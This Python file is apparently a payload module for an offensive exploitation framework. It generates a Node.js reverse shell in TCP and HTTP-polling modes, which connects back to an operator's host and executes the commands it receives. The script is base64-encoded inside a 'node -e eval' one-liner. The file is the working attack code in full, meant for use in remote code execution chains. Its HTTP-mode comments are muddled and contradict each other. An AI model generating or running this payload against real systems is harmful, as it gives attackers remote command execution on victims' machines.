from kittysploit import *
import base64
import json


class Module(Payload):

	CLIENT_LANGUAGE = "javascript"

	__info__ = {
		"name": "Node.js Reverse TCP Shell",
		"description": "Node.js reverse TCP command shell (node -e one-liner). Ideal for Node/npm RCE chains.",
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.MULTI,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(4444, "Callback port", True)
	node_binary = OptString("node", "Node binary on target", False)
	mode = OptString("tcp", "Mode: tcp | http (HTTP POST polling-style line shell)", False)

	def _tcp_script(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		# Compact Node reverse TCP: line-oriented cmd execution
		return (
			"(()=>{const n=require('net'),c=require('child_process'),"
			f"s=n.connect({port},{json.dumps(host)},()=>s.write('KittySploit node shell\\n'));"
			"let b='';s.on('data',d=>{b+=d;let i;while((i=b.indexOf('\\n'))>=0){let cmd=b.slice(0,i).trim();b=b.slice(i+1);"
			"if(!cmd)continue;if(/^exit|quit$/i.test(cmd)){s.end();return;}"
			"c.exec(cmd,{timeout:120000},(e,o,er)=>{s.write((o||'')+(er||'')+(e&&!o&&!er?('ERROR:'+e.message+'\\n'):''));});}});"
			"s.on('error',()=>{});})();"
		)

	def _http_script(self) -> str:
		# Simple HTTP reverse: POST output, GET commands from / - works with a custom tiny listener;
		# for exploit chains pair with reverse_tcp via local relay, or use as beacon to operator HTTP.
		# Here we implement TCP-over-upgrade style using http to LHOST for command fetch - actually
		# better: raw HTTP client that GETs http://lhost:lport/cmd and POSTs /out - needs matching server.
		# Keep HTTP mode as interactive-ish via chunked request to reverse_tcp won't work.
		# Implement: connect with net still but labeled http for users who want fetch-based:
		host = str(self.lhost)
		port = int(self.lport)
		return (
			"(()=>{const h=require('http'),c=require('child_process');"
			f"const H={json.dumps(host)},P={port};"
			"function poll(){h.get({host:H,port:P,path:'/'},res=>{let d='';res.on('data',x=>d+=x);"
			"res.on('end',()=>{const cmd=d.trim();if(!cmd||cmd==='wait')return setTimeout(poll,3000);"
			"if(/^exit|quit$/i.test(cmd))return;"
			"c.exec(cmd,{timeout:120000},(e,o,er)=>{"
			"const body=(o||'')+(er||'')||String(e||'');"
			"const r=h.request({host:H,port:P,path:'/',method:'POST',headers:{'Content-Length':Buffer.byteLength(body)}},()=>setTimeout(poll,500));"
			"r.on('error',()=>setTimeout(poll,3000));r.end(body);});});}).on('error',()=>setTimeout(poll,3000));}"
			"poll();})();"
		)

	def generate(self):
		mode = str(self.mode or "tcp").strip().lower()
		script = self._http_script() if mode == "http" else self._tcp_script()
		# Escape for node -e single quotes carefully: use base64
		b64 = base64.b64encode(script.encode()).decode("ascii")
		node = str(self.node_binary or "node")
		return f'{node} -e "eval(Buffer.from(\'{b64}\',\'base64\').toString())"'
